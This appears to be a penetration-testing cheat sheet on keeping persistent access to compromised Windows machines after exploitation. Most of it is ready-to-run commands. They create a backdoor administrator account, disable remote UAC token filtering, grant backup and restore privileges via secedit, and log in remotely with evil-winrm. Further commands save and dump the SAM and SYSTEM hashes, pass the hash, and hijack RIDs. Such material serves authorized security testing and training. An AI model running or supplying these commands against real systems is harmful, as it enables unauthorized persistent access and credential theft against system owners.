# windows persistence 1

## Persistence in Windows

### Definition

Persistence is a post-exploitation activity used by penetration testers in order to keep access to a system throughout the whole assessment and not to have to re-exploit the target even if the system restarts.

It can be considered that there are two types of persistence. These two types are:

```
Low privileged persistence
Privileged user persistence
```

#### Low Privileged Persistence

Low privileged persistence means that the penetration tester gained and uses persistence techniques to keep his access to the target system under a normal user profile/account (a domain user with no administrative rights).

#### Privileged User Persistence

After gaining access to a system, sometimes (because it would be inaccurate to say always), a penetration tester will do privilege escalation in order to gain access to the highest privilege user that can be on a Windows machine **(nt authority\system)**.

After privilege escalation, he will use persistence in order to keep the access he gained.

***

### Persistence Techniques

#### Account Tempering Techniques

* Creating new users and assigning them to privileged groups.
* Cracking accounts hashes (SAM, SYSTEM)
* RID Hijacking

**Creating new users and assigning them to privileged groups**

```
# Create a new user
net user pentester pentest@1234 /add

# View Users
net users

# View Groups
net groups

# Add a user to administrator group
net localgroup administrators <username> /add

# Add a user to "Remote Management Users" group
net localgroup "Remote Management Users" <username> /add

# Disable UAC
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1

# Login using the backdoored user
evil-winrm -u pentester -p 'pentest@1234' -i 192.168.56.13

# View group details
whoami /groups

```

```
# Persistence using SeBackupPrivilege and SeRestorePrivilege

# victim machine
secedit /export /cfg config.inf

# Open the file in notepad and search for SeBackup

# append the user in the the below line
SeBackupPrivilege = *S-1-5-32-544,*S-1-5-32-549,*S-1-5-32-551,pentester

# Search for SeRestore and append the user
SeRestorePrivilege = *S-1-5-32-544,*S-1-5-32-549,*S-1-5-32-551, pentester

# convert the config.inf to config.db
secedit /import /cfg config.inf /db config.db
secedit /configure /db config.db /cfg config.inf

# Disable UAC
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1

# Enable the user to login via WinRm
# powershell command
Set-PSSessionConfiguration -Name Microsoft.Powershell showSecurityDescriptorUI

# Add the user by clicking on the Add button
# Give full control
# Apply and Save

# Switch user
runas /user:pentester cmd

# attacker machine
evil-winrm -u pentester -p 'pentest@1234' -i 192.168.56.13

whoami /groups
whoami /priv

```

**Grabbing and Dumping SAM hashes**

```
# From evil-winrm interface
reg save hklm\system system.bak
reg save hklm\sam sam.bak

# Download the files in the local kali machine
download sam.bak
download system.bak

# Dumping hashes
sudo python3 secretsdump.py -sam /home/chinju/sam.bak -system /home/chinju/system.bak LOCAL

# PTH Attack using evil-winrm
evil-winrm -i <ip> -u Administrator -H <NT Hash>

```

**RID Hijacking**

```
# View RIDs
wmic useraccount get name,sid

# PsExec
PsExec.exe -i -s regedit

# Change RID

HKLM/SAM/SAM/Domains/Account/Users
```

***

## REFERENCES

* https://github.com/Shuvsec/Pentesting-Resources/blobmain/Persistence%5BPost%20Exploitation%5D.md
* https://www.ired.team/offensive-security/persistence/rid-hijacking
* https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
* https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/secedit
